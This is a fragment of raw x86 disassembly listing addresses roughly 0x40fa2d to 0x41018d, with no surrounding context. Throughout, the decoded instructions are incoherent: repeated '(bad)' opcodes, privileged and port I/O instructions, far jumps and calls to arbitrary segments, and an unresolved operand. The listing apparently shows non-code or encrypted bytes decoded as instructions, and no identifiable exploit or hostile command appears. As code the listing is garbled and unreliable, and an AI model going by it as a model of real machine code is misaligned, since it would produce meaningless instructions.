  40fa2d:	loop   0x40fa64
  40fa2f:	xor    BYTE PTR [ebp+0x6b08f3a8],cl
  40fa35:	mov    eax,0x11eeb369
  40fa3a:	dec    esp
  40fa3b:	add    DWORD PTR [esi],eax
  40fa3d:	mov    DWORD PTR [edi],ecx
  40fa3f:	fild   WORD PTR [edx]
  40fa41:	mov    ebx,0x5e4d73e3
  40fa46:	ficom  WORD PTR [ecx+0x1]
  40fa49:	sbb    bh,BYTE PTR [edi+eax*1+0x7e]
  40fa4d:	add    al,0x22
  40fa4f:	jae    0x40fa22
  40fa51:	xchg   edx,eax
  40fa52:	mov    eax,0xeed1a55c
  40fa57:	push   edx
  40fa58:	mov    dh,0xef
  40fa5a:	lds    esp,FWORD PTR [edx-0x3d]
  40fa5d:	arpl   bp,si
  40fa5f:	fld    QWORD PTR [esp+ebp*1]
  40fa62:	mov    edi,0x3c6c5384
  40fa67:	xchg   esi,eax
  40fa68:	sahf   
  40fa69:	sub    al,0x39
  40fa6b:	xlat   BYTE PTR ds:[ebx]
  40fa6c:	je     0x40fa90
  40fa6e:	jo     0x40fa5c
  40fa70:	pop    ds
  40fa71:	push   0xc2012b53
  40fa76:	hlt    
  40fa77:	mov    al,0xb
  40fa79:	pop    ss
  40fa7a:	mov    al,ds:0xe282e948
  40fa7f:	int    0xa0
  40fa81:	leave  
  40fa82:	cwde   
  40fa83:	scas   eax,DWORD PTR es:[edi]
  40fa84:	or     eax,0x60e73c38
  40fa89:	pop    ebp
  40fa8a:	adc    al,0xd1
  40fa8c:	mov    ds:0x6483c5db,eax
  40fa91:	add    al,0x90
  40fa93:	pop    ebp
  40fa94:	or     esp,DWORD PTR ds:0x4a33cd5f
  40fa9a:	mov    esp,0xb9a265ea
  40fa9f:	ret    
  40faa0:	jno    0x40fac0
  40faa2:	or     esp,ebp
  40faa4:	sub    BYTE PTR [ecx+eax*2],0xba
  40faa8:	jb     0x40face
  40faaa:	push   cs
  40faab:	shl    DWORD PTR [ebx],cl
  40faad:	iret   
  40faae:	add    bl,BYTE PTR ds:0x91bf91b8
  40fab4:	mov    ecx,0x8a55d1a2
  40fab9:	pop    ebp
  40faba:	sub    BYTE PTR [edi-0x15cf31c9],ah
  40fac0:	cld    
  40fac1:	add    al,0x2a
  40fac3:	push   esp
  40fac4:	jmp    0x40fb0f
  40fac6:	sub    edx,DWORD PTR [esp+eax*4]
  40fac9:	mov    bh,0x9f
  40facb:	shl    esp,0x6c
  40face:	bound  ebx,QWORD PTR [ecx]
  40fad0:	pop    esp
  40fad1:	bswap  edi
  40fad3:	sbb    eax,0xb718468a
  40fad8:	pushf  
  40fad9:	dec    edi
  40fada:	lsl    edi,WORD PTR [ebp-0x1ec4242d]
  40fae1:	dec    DWORD PTR [esi+ebp*2+0x29]
  40fae5:	add    ebx,DWORD PTR [edi+0x48]
  40fae8:	jb     0x40faaa
  40faea:	mov    esp,0x6b164b5e
  40faef:	and    ebp,DWORD PTR [edi+0x22]
  40faf2:	inc    ebp
  40faf3:	scas   al,BYTE PTR es:[edi]
  40faf4:	cli    
  40faf5:	mov    DWORD PTR [edi-0x78],esp
  40faf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faf9:	mov    esi,0xd0ba203c
  40fafe:	inc    ebx
  40faff:	sar    BYTE PTR ds:0x971c325f,0x83
  40fb06:	lods   eax,DWORD PTR ds:[esi]
  40fb07:	lods   eax,DWORD PTR ds:[esi]
  40fb08:	and    BYTE PTR [ebx-0x3e],dl
  40fb0b:	stos   BYTE PTR es:[edi],al
  40fb0c:	inc    edi
  40fb0d:	pop    ebx
  40fb0e:	fwait
  40fb0f:	xchg   ebx,eax
  40fb10:	adc    cl,ah
  40fb12:	lahf   
  40fb13:	(bad)  
  40fb14:	jmp    0x11d8:0x4ef8d3a3
  40fb1b:	mov    edx,0x9d77e2ea
  40fb20:	std    
  40fb21:	in     eax,dx
  40fb22:	jg     0x40fb9b
  40fb24:	or     DWORD PTR [ebp+ebp*4+0x6c82239b],ebx
  40fb2b:	dec    esi
  40fb2c:	mov    edi,0x8b95776d
  40fb31:	pop    edx
  40fb32:	xchg   esi,eax
  40fb33:	mul    BYTE PTR [esp+esi*2-0x7b]
  40fb37:	pop    ebx
  40fb38:	mov    al,0x14
  40fb3a:	mov    edi,0x90d1b20d
  40fb3f:	mov    esp,DWORD PTR [edi+0x6d]
  40fb42:	mov    cl,0x97
  40fb44:	shl    DWORD PTR [ecx],0x9d
  40fb47:	push   cs
  40fb48:	xor    BYTE PTR [edi],bh
  40fb4a:	push   eax
  40fb4b:	push   ebp
  40fb4c:	push   ebp
  40fb4d:	retf   
  40fb4e:	js     0x40fb9d
  40fb50:	sub    DWORD PTR [ebx-0x69],ecx
  40fb53:	or     BYTE PTR [edi+0x5b],dh
  40fb56:	scas   eax,DWORD PTR es:[edi]
  40fb57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb58:	pop    edx
  40fb59:	inc    edx
  40fb5a:	push   esp
  40fb5b:	aaa    
  40fb5c:	dec    ebp
  40fb5d:	out    0xeb,al
  40fb5f:	fsubr  QWORD PTR [ebp-0x54]
  40fb62:	lods   al,BYTE PTR ds:[esi]
  40fb63:	mov    esi,0xb969e763
  40fb68:	sub    al,0xb4
  40fb6a:	(bad)  
  40fb6b:	fldenv [ecx-0x21]
  40fb6e:	retf   
  40fb6f:	js     0x40fb88
  40fb71:	out    dx,eax
  40fb72:	add    BYTE PTR [edx-0xe],bl
  40fb75:	int3   
  40fb76:	je     0x40fbdb
  40fb78:	lock arpl WORD PTR [edi-0x58],sp
  40fb7c:	aam    0x7f
  40fb7e:	cmp    al,0x5
  40fb80:	sub    esp,DWORD PTR [edi+ebp*1-0x10]
  40fb84:	cwde   
  40fb85:	or     eax,DWORD PTR cs:[edx+edi*8-0x40]
  40fb8a:	fild   QWORD PTR [ecx-0x4]
  40fb8d:	mov    bh,0x93
  40fb8f:	mov    eax,ds:0xb6c3e713
  40fb94:	cmp    edx,DWORD PTR [edx+0x58]
  40fb97:	daa    
  40fb98:	push   edi
  40fb99:	mov    ds:0xa0c1389f,eax
  40fb9e:	outs   dx,BYTE PTR ds:[esi]
  40fb9f:	hlt    
  40fba0:	jle    0x40fb36
  40fba2:	rol    al,cl
  40fba4:	movups XMMWORD PTR [ebx+0x7d],xmm5
  40fba8:	js     0x40fbc5
  40fbaa:	bound  edx,QWORD PTR [esi-0x4a]
  40fbad:	(bad)  
  40fbae:	xchg   ebp,eax
  40fbaf:	jmp    0xb7e4:0x4fa09c0
  40fbb6:	cmp    cl,0x53
  40fbb9:	mov    bh,BYTE PTR [ebx-0x23]
  40fbbc:	arpl   bx,bp
  40fbbe:	fs xchg ebx,eax
  40fbc0:	test   edx,eax
  40fbc2:	rcl    BYTE PTR [edi+0x59dab218],1
  40fbc8:	mov    dh,0xd9
  40fbca:	in     eax,0x73
  40fbcc:	mov    DWORD PTR [edi+0x62e65b5b],eax
  40fbd2:	fs data16 into 
  40fbd5:	jl     0x40fc49
  40fbd7:	out    0xa3,al
  40fbd9:	ret    
  40fbda:	mov    ds:0x3fec108c,al
  40fbdf:	push   cs
  40fbe0:	sub    DWORD PTR [edx+0x3c1f1d34],esp
  40fbe6:	(bad)  
  40fbe7:	xor    eax,0xb53dfa3a
  40fbec:	clc    
  40fbed:	imul   BYTE PTR [ecx-0x6d772fe8]
  40fbf3:	rcr    DWORD PTR [esi+eiz*8+0x1],0xb4
  40fbf8:	loopne 0x40fbd8
  40fbfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbfb:	pop    eax
  40fbfc:	mov    BYTE PTR [edi-0xa],cl
  40fbff:	fadd   st(2),st
  40fc01:	loop   0x40fbf7
  40fc03:	sbb    dl,al
  40fc05:	jg     0x40fc45
  40fc07:	pop    esi
  40fc08:	fsubr  st(5),st
  40fc0a:	ret    
  40fc0b:	(bad)  
  40fc0c:	ror    BYTE PTR [ecx+0x72842fde],0xf5
  40fc13:	jo     0x40fb97
  40fc15:	test   BYTE PTR [esi+0xb],0x4b
  40fc19:	and    eax,DWORD PTR [eax-0x2da02844]
  40fc1f:	and    ecx,DWORD PTR [esi+0x32]
  40fc22:	and    al,0x1b
  40fc24:	jno    0x40fc0d
  40fc26:	adc    bl,bh
  40fc28:	jne    0x40fc8d
  40fc2a:	fnstcw WORD PTR [ebp+0x6220e2d4]
  40fc30:	xor    eax,0x73c7763f
  40fc35:	adc    ebp,DWORD PTR [ebp+esi*1+0x4c]
  40fc39:	call   0x8510:0xe06b0a7d
  40fc40:	std    
  40fc41:	ins    DWORD PTR es:[edi],dx
  40fc42:	pushf  
  40fc43:	xor    BYTE PTR [edx],bl
  40fc45:	std    
  40fc46:	loopne 0x40fcbe
  40fc48:	or     eax,0xeab23aab
  40fc4d:	cwde   
  40fc4e:	enter  0x3885,0xe2
  40fc52:	ss inc ebx
  40fc54:	lods   al,BYTE PTR ds:[esi]
  40fc55:	rcr    BYTE PTR ds:0x65df7b20,cl
  40fc5b:	adc    ebx,0x54
  40fc5e:	push   ebx
  40fc5f:	mov    bh,0xeb
  40fc61:	dec    ebx
  40fc62:	mov    al,0x24
  40fc64:	jle    0x40fcaf
  40fc66:	or     DWORD PTR [ebp+edx*1+0x792aec33],0x6ae2f1e9
  40fc71:	or     al,0x73
  40fc73:	sahf   
  40fc74:	jl     0x40fc42
  40fc76:	jl     0x40fcec
  40fc78:	icebp  
  40fc79:	nop
  40fc7a:	fcomp  QWORD PTR [ebp-0x1]
  40fc7d:	shl    DWORD PTR [ebx+0x53755aeb],0xee
  40fc84:	inc    ebp
  40fc85:	jmp    0xaa76:0x71f5965a
  40fc8c:	dec    edi
  40fc8d:	pop    ss
  40fc8e:	leave  
  40fc8f:	sar    ebp,1
  40fc91:	aam    0x31
  40fc93:	imul   esi,DWORD PTR ds:0x4a652b38,0xa58ec0f1
  40fc9d:	inc    esi
  40fc9e:	imul   ebx,DWORD PTR [esi],0x2a
  40fca1:	jo     0x40fcd0
  40fca3:	ins    DWORD PTR es:[edi],dx
  40fca4:	inc    edx
  40fca5:	pushf  
  40fca6:	adc    BYTE PTR [ebp+0x67],ah
  40fca9:	ja     0x40fd21
  40fcab:	shl    dl,1
  40fcad:	jne    0x40fc38
  40fcaf:	popa   
  40fcb0:	mov    dl,0x64
  40fcb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcb3:	(bad)  
  40fcb4:	stos   BYTE PTR es:[edi],al
  40fcb5:	sahf   
  40fcb6:	pop    edx
  40fcb7:	in     al,dx
  40fcb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcb9:	sub    BYTE PTR [ebp-0x271ed81c],dl
  40fcbf:	lods   al,BYTE PTR ds:[esi]
  40fcc0:	aaa    
  40fcc1:	add    eax,DWORD PTR [ebp+esi*2+0x2a]
  40fcc5:	lods   eax,DWORD PTR ds:[esi]
  40fcc6:	and    bl,BYTE PTR [ebx]
  40fcc8:	in     eax,0x97
  40fcca:	xchg   edi,eax
  40fccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fccc:	cmp    bl,BYTE PTR [ebx+0x3]
  40fccf:	icebp  
  40fcd0:	add    eax,ecx
  40fcd2:	jmp    0x40ffa1
  40fcd7:	lock sub DWORD PTR [ebx-0x20],esp
  40fcdb:	arpl   WORD PTR [eax+0x71],si
  40fcde:	sub    ebp,esi
  40fce0:	scas   eax,DWORD PTR es:[edi]
  40fce1:	ret    
  40fce2:	rcl    DWORD PTR [eax-0x9],0xc5
  40fce6:	or     BYTE PTR [ecx-0x5381814d],bh
  40fcec:	jl     0x40fd6c
  40fcee:	jle    0x40fc92
  40fcf0:	or     DWORD PTR [edi-0x39],ebp
  40fcf3:	adc    al,0x20
  40fcf5:	jae    0x40fca8
  40fcf7:	sbb    bh,BYTE PTR ds:0xa69e7889
  40fcfd:	test   DWORD PTR [eax],edi
  40fcff:	stc    
  40fd00:	gs jne 0x40fce7
  40fd03:	movhps QWORD PTR [edi+0x38213f27],xmm1
  40fd0a:	jg     0x40fd37
  40fd0c:	cmp    edi,edi
  40fd0e:	(bad)  
  40fd0f:	adc    ch,ch
  40fd11:	sbb    ebp,DWORD PTR [ebp+0x29d00c6f]
  40fd17:	inc    eax
  40fd18:	xor    BYTE PTR [ecx-0x33],bh
  40fd1b:	xchg   esi,eax
  40fd1c:	std    
  40fd1d:	int3   
  40fd1e:	push   esp
  40fd1f:	das    
  40fd20:	mov    ds:0x670cbe1d,eax
  40fd25:	ss clts 
  40fd28:	xor    al,0x18
  40fd2a:	(bad)  
  40fd2b:	clc    
  40fd2c:	test   DWORD PTR [edi-0x28454fbb],0xb0520d0d
  40fd36:	sbb    ah,BYTE PTR [edx]
  40fd38:	cs jecxz 0x40fd67
  40fd3b:	(bad)  
  40fd3d:	shl    ecx,cl
  40fd3f:	jle    0x40fd02
  40fd41:	cmp    ebx,eax
  40fd43:	int    0x54
  40fd45:	ins    DWORD PTR es:[edi],dx
  40fd46:	leave  
  40fd47:	aaa    
  40fd48:	les    esp,FWORD PTR [esi-0x35daff]
  40fd4e:	push   cs
  40fd4f:	aad    0x1c
  40fd51:	loop   0x40fda5
  40fd53:	inc    DWORD PTR [esi+0x7b984fc5]
  40fd59:	or     eax,0xc5c745db
  40fd5e:	bound  ebx,QWORD PTR [esp+ebx*8-0x48cd057a]
  40fd65:	aas    
  40fd66:	push   ecx
  40fd67:	test   DWORD PTR [ebx],esp
  40fd69:	(bad)  
  40fd6a:	xchg   edi,eax
  40fd6b:	and    eax,0x9519a4b6
  40fd70:	add    DWORD PTR [ecx+0x27d3dc15],edi
  40fd76:	int3   
  40fd77:	daa    
  40fd78:	repz pusha 
  40fd7a:	dec    edx
  40fd7b:	mov    dl,0xb4
  40fd7d:	push   0xffffffe3
  40fd7f:	jl     0x40fdf5
  40fd81:	mov    bl,0xb2
  40fd83:	test   BYTE PTR [ecx+0x2665aa65],0x16
  40fd8a:	mov    esi,0x713d8538
  40fd8f:	imul   ebp,DWORD PTR [eax],0xedfbc8f9
  40fd95:	jmp    0xe5c4968f
  40fd9a:	fwait
  40fd9b:	repnz dec esi
  40fd9d:	aas    
  40fd9e:	lods   eax,DWORD PTR ds:[esi]
  40fd9f:	popf   
  40fda0:	test   al,0x48
  40fda2:	and    dl,BYTE PTR [eax+0x38c80017]
  40fda8:	scas   al,BYTE PTR es:[edi]
  40fda9:	push   cs
  40fdaa:	enter  0x3d72,0xea
  40fdae:	xchg   esi,eax
  40fdaf:	or     ebx,DWORD PTR [ecx+0x1faa7bfe]
  40fdb5:	lahf   
  40fdb6:	(bad)  
  40fdb7:	div    BYTE PTR [edi+eiz*4+0x73]
  40fdbb:	clc    
  40fdbc:	xor    bh,BYTE PTR [esi+esi*1-0x15]
  40fdc0:	je     0x40fddd
  40fdc2:	pop    es
  40fdc3:	fmulp  st(5),st
  40fdc5:	pop    ss
  40fdc6:	push   esp
  40fdc7:	sub    BYTE PTR [edi+0x7de90500],dh
  40fdcd:	scas   al,BYTE PTR es:[edi]
  40fdce:	fisub  WORD PTR [ebx-0x70e2e6c8]
  40fdd4:	pop    esi
  40fdd5:	or     eax,ecx
  40fdd7:	jbe    0x40fdc8
  40fdd9:	dec    ebx
  40fddb:	mov    cl,0x3c
  40fddd:	and    al,0x9e
  40fddf:	outs   dx,DWORD PTR ds:[esi]
  40fde0:	fmul   DWORD PTR [edx]
  40fde2:	push   edx
  40fde3:	enter  0xc43b,0x62
  40fde7:	add    al,0x37
  40fde9:	push   esi
  40fdea:	push   edx
  40fdeb:	pop    eax
  40fdec:	add    ebx,DWORD PTR [edi]
  40fdee:	fs pusha 
  40fdf0:	cmp    al,0xb6
  40fdf2:	popa   
  40fdf3:	and    eax,0xc9466536
  40fdf8:	xchg   ecx,eax
  40fdf9:	add    ecx,eax
  40fdfb:	enter  0xfc16,0x83
  40fdff:	sub    DWORD PTR [ecx+0x3a],edi
  40fe02:	imul   ecx,esi,0x668e0cfb
  40fe08:	adc    ch,BYTE PTR [esi]
  40fe0a:	dec    eax
  40fe0b:	rol    DWORD PTR [ebp+0x25],cl
  40fe0e:	ss aaa 
  40fe10:	(bad)  
  40fe11:	shl    DWORD PTR [edi-0x3c],cl
  40fe14:	dec    ebx
  40fe15:	pop    eax
  40fe16:	xchg   ebx,eax
  40fe17:	pushf  
  40fe18:	loop   0x40fdfc
  40fe1a:	xchg   edi,eax
  40fe1b:	ret    
  40fe1c:	mov    ds:0x636e4c41,eax
  40fe21:	and    DWORD PTR [eax+edx*1],ebp
  40fe24:	cmp    al,0xba
  40fe26:	mov    edx,0xc7d417f3
  40fe2b:	mov    ds:0xdcf1171,eax
  40fe30:	(bad)  
  40fe31:	ins    DWORD PTR es:[edi],dx
  40fe32:	or     dh,bl
  40fe34:	cmp    cl,BYTE PTR [ebx]
  40fe36:	mov    bl,ah
  40fe38:	add    BYTE PTR [eax+0x3bba8767],ch
  40fe3e:	sar    BYTE PTR [ebp-0x31],cl
  40fe41:	lea    ecx,[ecx+0x3]
  40fe44:	jmp    0x40fe18
  40fe46:	push   esp
  40fe47:	mov    al,ds:0x2bb664ae
  40fe4c:	mov    eax,ds:0x60456a7c
  40fe51:	nop
  40fe52:	inc    DWORD PTR [esi-0x588ce6fc]
  40fe58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe59:	jnp    0x40feaa
  40fe5b:	retf   0x6b72
  40fe5e:	cmp    BYTE PTR [ecx-0x4847968c],bl
  40fe64:	shl    BYTE PTR [ebx-0x61],0xa7
  40fe68:	xchg   ebx,eax
  40fe69:	scas   eax,DWORD PTR es:[edi]
  40fe6a:	or     eax,0x7bc93e7b
  40fe6f:	mov    edx,0x61d369da
  40fe74:	inc    esi
  40fe75:	pusha  
  40fe76:	push   eax
  40fe77:	imul   ebx,DWORD PTR [ebp-0x7d],0xffffffa9
  40fe7b:	(bad)  
  40fe7c:	int    0x7d
  40fe7e:	push   ss
  40fe7f:	add    eax,0x44ac5b47
  40fe84:	sahf   
  40fe85:	inc    ebp
  40fe86:	mov    ds:0x5b6dfb43,eax
  40fe8b:	out    dx,eax
  40fe8c:	pop    esp
  40fe8d:	in     al,dx
  40fe8e:	cmp    bh,BYTE PTR [ecx]
  40fe90:	mov    esi,DWORD PTR [ebx]
  40fe92:	pop    esi
  40fe93:	lds    edi,FWORD PTR [ebp+ebp*4+0x76]
  40fe97:	push   esi
  40fe98:	sub    dl,dh
  40fe9a:	pusha  
  40fe9b:	pusha  
  40fe9c:	ins    BYTE PTR es:[edi],dx
  40fe9d:	mov    ch,0xd7
  40fe9f:	adc    BYTE PTR [ebp+0x5b],ch
  40fea2:	cld    
  40fea3:	outs   dx,BYTE PTR ds:[esi]
  40fea4:	out    0x6b,al
  40fea6:	and    BYTE PTR [esi-0x7dd7a44b],0xec
  40fead:	fwait
  40feae:	cdq    
  40feaf:	fdivr  st,st(4)
  40feb1:	jmp    0x8969:0xee231357
  40feb8:	add    al,0x5d
  40feba:	(bad)  
  40febb:	jbe    0x40fead
  40febd:	mov    ds,WORD PTR [ebx]
  40febf:	and    dh,BYTE PTR [ebp-0x321b6a60]
  40fec5:	bound  ebx,QWORD PTR [esi+0x78412d20]
  40fecb:	cmp    al,0xdd
  40fecd:	push   edx
  40fece:	push   eax
  40fecf:	in     al,0xa3
  40fed1:	jbe    0x40fee8
  40fed3:	jae    0x40ff31
  40fed5:	int    0xfb
  40fed7:	pop    ebx
  40fed8:	mov    ds:0x18bc496a,eax
  40fedd:	(bad)
  40fee1:	imul   esi,DWORD PTR [eax+eiz*1-0x1c],0xffffffa8
  40fee6:	push   esi
  40fee7:	out    dx,eax
  40fee8:	and    BYTE PTR [ebx-0x738ef496],dl
  40feee:	jno    0x40fea0
  40fef0:	ror    DWORD PTR [esi+eiz*2],0xaa
  40fef4:	cwde   
  40fef5:	or     al,bl
  40fef7:	xchg   ecx,eax
  40fef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fef9:	fstp   DWORD PTR [edx-0xa]
  40fefc:	xor    eax,0xce638063
  40ff01:	fld    DWORD PTR [ebp-0x634fbec7]
  40ff07:	sar    BYTE PTR [ebx],cl
  40ff09:	and    BYTE PTR [eax],ah
  40ff0b:	arpl   WORD PTR [edi+0x3f0033a5],di
  40ff11:	sahf   
  40ff12:	push   ebp
  40ff13:	ins    DWORD PTR es:[edi],dx
  40ff14:	mov    al,0x7d
  40ff16:	push   edi
  40ff17:	fsub   QWORD PTR [edx+0x2c22deb5]
  40ff1d:	iret   
  40ff1e:	sar    BYTE PTR [ecx+0x59ef10e1],1
  40ff24:	sbb    eax,0x508f547a
  40ff29:	and    bh,BYTE PTR [eax]
  40ff2b:	jge    0x40fef6
  40ff2d:	cli    
  40ff2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff2f:	sub    BYTE PTR [esi+0x55c0e6ad],bh
  40ff35:	push   edi
  40ff36:	and    dh,BYTE PTR [ebx+0x7406ca3b]
  40ff3c:	repnz (bad) 
  40ff3e:	test   eax,0x174f0191
  40ff43:	call   0x39ccf5d7
  40ff48:	sub    DWORD PTR [eax-0x38],0xa0004d00
  40ff4f:	mov    dh,0xe9
  40ff51:	ror    BYTE PTR [eax],cl
  40ff53:	xchg   ebx,eax
  40ff54:	loopne 0x40ffbf
  40ff56:	iret   
  40ff57:	dec    ecx
  40ff58:	std    
  40ff59:	jne    0x40ffd6
  40ff5b:	lods   eax,DWORD PTR ds:[esi]
  40ff5c:	lahf   
  40ff5d:	rol    DWORD PTR [ebp-0xb],cl
  40ff60:	inc    edx
  40ff61:	lods   al,BYTE PTR ds:[esi]
  40ff62:	ss aaa 
  40ff64:	mov    bh,0xf8
  40ff66:	push   ebx
  40ff67:	mov    al,0xa3
  40ff69:	std    
  40ff6a:	or     BYTE PTR [ecx-0x35],dh
  40ff6d:	pop    ecx
  40ff6e:	add    al,BYTE PTR [ecx-0x5a]
  40ff71:	dec    esp
  40ff72:	cmp    ecx,0xffffff8b
  40ff75:	cmp    edi,ebx
  40ff77:	sahf   
  40ff78:	stc    
  40ff79:	aaa    
  40ff7a:	sbb    BYTE PTR [ebp+0x34f62d33],cl
  40ff80:	(bad)  
  40ff81:	stc    
  40ff82:	rcl    DWORD PTR [ebx+0x1e],1
  40ff85:	sbb    al,BYTE PTR [edi]
  40ff87:	test   BYTE PTR [esi-0x80],0x5e
  40ff8b:	neg    ebx
  40ff8d:	into   
  40ff8e:	adc    eax,0x603bf8db
  40ff93:	ret    0xddcd
  40ff96:	inc    edx
  40ff97:	outs   dx,BYTE PTR ds:[esi]
  40ff98:	aaa    
  40ff99:	mov    edx,0x3f452a1b
  40ff9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff9f:	push   esi
  40ffa0:	dec    ecx
  40ffa1:	imul   eax,esi
  40ffa4:	mov    esi,DWORD PTR [ebp+0xc]
  40ffa7:	mov    DWORD PTR ds:0x433723,0x6048
  40ffb1:	cmp    esi,eax
  40ffb3:	jne    0x4102bc
  40ffb9:	mov    eax,DWORD PTR [ebp-0x4]
  40ffbc:	sbb    DWORD PTR ds:0x4337e7,0x14e6
  40ffc6:	jmp    0x410295
  40ffcb:	inc    eax
  40ffcc:	sbb    BYTE PTR [esi+0x407076f6],dh
  40ffd2:	test   al,0x4a
  40ffd4:	add    eax,0x1f7039b1
  40ffd9:	shl    cl,0xf7
  40ffdc:	mov    esi,0x7cac7e7e
  40ffe1:	jle    0x410061
  40ffe3:	or     bl,BYTE PTR [ecx]
  40ffe5:	mov    edi,0x73aae6a3
  40ffea:	mov    ds:0x3c3662c5,eax
  40ffef:	sti    
  40fff0:	ret    0xbf1a
  40fff3:	push   0x9ac4abbf
  40fff8:	xor    eax,0x53792b58
  40fffd:	inc    eax
  40fffe:	stos   DWORD PTR es:[edi],eax
  40ffff:	pop    esi
  410000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410001:	stos   DWORD PTR es:[edi],eax
  410002:	lods   al,BYTE PTR ds:[esi]
  410003:	pop    edx
  410004:	ret    0x6e20
  410007:	hlt    
  410008:	xlat   BYTE PTR ds:[ebx]
  410009:	loope  0x40ff90
  41000b:	xchg   ebp,eax
  41000c:	dec    ecx
  41000d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41000e:	cmp    DWORD PTR [ebx-0x52a9f778],ecx
  410014:	out    dx,eax
  410015:	lea    edx,ds:0xb1dd3dfc
  41001b:	jmp    DWORD PTR [ebx]
  41001d:	mov    al,ds:0xbfc5c0fd
  410022:	jmp    0x40ffb2
  410024:	dec    esi
  410025:	rcr    DWORD PTR [ecx+0x167089e3],cl
  41002b:	mov    bl,0x30
  41002d:	mov    dl,0xd1
  41002f:	jne    0x41002d
  410031:	cmp    ebx,edi
  410033:	aad    0x6a
  410035:	in     eax,0x2f
  410037:	xchg   BYTE PTR [ebx+0x8],ch
  41003a:	jnp    0x41009d
  41003c:	xor    al,0x32
  41003e:	pop    ebp
  41003f:	mov    bh,0xc4
  410041:	fisttp WORD PTR [ecx]
  410043:	cmp    eax,0x61ec7c7a
  410048:	and    eax,0xfde6ab6d
  41004d:	pop    ss
  41004e:	jae    0x40ffd5
  410050:	cs sbb eax,eax
  410053:	repz call 0x44c0edd5
  410059:	ds push es
  41005b:	dec    edx
  41005c:	add    eax,0xe6ceded4
  410061:	stos   DWORD PTR es:[edi],eax
  410062:	mov    cl,0xdb
  410064:	minps  xmm6,XMMWORD PTR [ebp-0x1c13deae]
  41006b:	scas   al,BYTE PTR es:[edi]
  41006c:	add    eax,0x758c531f
  410071:	or     al,0x91
  410073:	in     eax,0x9b
  410075:	popf   
  410076:	scas   eax,DWORD PTR es:[edi]
  410077:	inc    esp
  410078:	(bad)  
  410079:	jnp    0x410013
  41007b:	mov    DWORD PTR [edx+ebx*2-0x1b7b3508],eax
  410082:	cmc    
  410083:	ins    BYTE PTR es:[edi],dx
  410084:	inc    ebp
  410085:	mov    esp,0x9ccce4d
  41008a:	dec    eax
  41008b:	out    0xbe,eax
  41008d:	push   edi
  41008e:	(bad)  
  410090:	dec    ebp
  410091:	inc    eax
  410092:	and    ah,al
  410094:	mov    esp,0x5310824c
  410099:	mov    ds:0xd6a8911,al
  41009e:	xor    dl,BYTE PTR [edx-0x554c8df6]
  4100a4:	pop    eax
  4100a5:	add    eax,0xfcece4a1
  4100aa:	push   esi
  4100ab:	xor    al,0x25
  4100ad:	aam    0x48
  4100af:	or     DWORD PTR [ebx-0x3e8c8da4],ecx
  4100b5:	xor    edi,DWORD PTR [edi+0x28576379]
  4100bb:	dec    esp
  4100bc:	shr    DWORD PTR [edx+ebp*1+0x163d6bef],0xc8
  4100c4:	icebp  
  4100c5:	cli    
  4100c6:	pop    esp
  4100c7:	push   ebx
  4100c8:	cmp    al,0x90
  4100ca:	push   ds
  4100cb:	or     al,0x77
  4100cd:	jmp    0x410127
  4100cf:	mov    ch,0xaf
  4100d1:	call   0x7643:0xd4aeeb10
  4100d8:	outs   dx,BYTE PTR ds:[esi]
  4100d9:	inc    esi
  4100da:	js     0x41009a
  4100dc:	add    ch,BYTE PTR [esi]
  4100de:	xor    ebp,DWORD PTR [ecx+0x72]
  4100e1:	inc    ecx
  4100e2:	jg     0x4100cf
  4100e4:	mov    eax,0x80da4682
  4100e9:	xor    eax,0x5faeb775
  4100ee:	test   BYTE PTR [edx-0x46],0x1a
  4100f2:	jns    0x4100f0
  4100f4:	mov    eax,0x4e913c87
  4100f9:	(bad)  
  4100fa:	xor    eax,0x43fca8aa
  4100ff:	inc    eax
  410100:	cmp    eax,0x303110f6
  410105:	pop    es
  410106:	retf   0xc353
  410109:	call   0xae21:0xb3362f8e
  410110:	xchg   esp,eax
  410111:	leave  
  410112:	jecxz  0x410119
  410114:	push   esp
  410115:	jecxz  0x410121
  410117:	popa   
  410118:	aad    0xb3
  41011a:	and    al,0xae
  41011c:	lahf   
  41011d:	jnp    0x4100ec
  41011f:	adc    DWORD PTR ds:0x4df8b311,esi
  410125:	popf   
  410126:	adc    al,0xc6
  410128:	mov    WORD PTR [ebx-0x4f],?
  41012b:	and    bh,BYTE PTR [esi]
  41012d:	ins    BYTE PTR es:[edi],dx
  41012e:	push   ecx
  41012f:	push   ds
  410130:	sub    edi,eax
  410132:	lds    eax,FWORD PTR [eax+eiz*2]
  410135:	ret    
  410136:	cwde   
  410137:	or     DWORD PTR [ecx+eiz*4-0x5d648510],0x9912403b
  410142:	add    ch,BYTE PTR [ecx+0x63]
  410145:	jno    0x410185
  410147:	cld    
  410148:	es clc 
  41014a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41014b:	xchg   ebx,eax
  41014c:	call   0x3dde025e
  410151:	dec    eax
  410152:	cmp    ecx,DWORD PTR [ebp-0x1e]
  410155:	and    dl,ah
  410157:	sub    DWORD PTR [esi+0x2a],0xfed4a74f
  41015e:	cmp    BYTE PTR [ebx+0x11],cl
  410161:	ins    DWORD PTR es:[edi],dx
  410162:	sti    
  410163:	dec    eax
  410164:	adc    al,0xa2
  410166:	test   ebx,0x8cf3bc4
  41016c:	fisub  WORD PTR [edx]
  41016e:	dec    ebx
  41016f:	add    DWORD PTR [eax-0x2f],0xffffffed
  410173:	and    bl,bh
  410175:	dec    ebp
  410176:	jmp    0x56a969c6
  41017b:	iret   
  41017c:	shl    DWORD PTR [edi+eiz*4],1
  41017f:	xchg   esp,eax
  410180:	mov    ebp,edi
  410182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410183:	call   DWORD PTR ds:0x2e8ccc1f
  410189:	imul   edi,DWORD PTR [edi-0x67],0xffffffb3
  41018d:	retf   0x82f
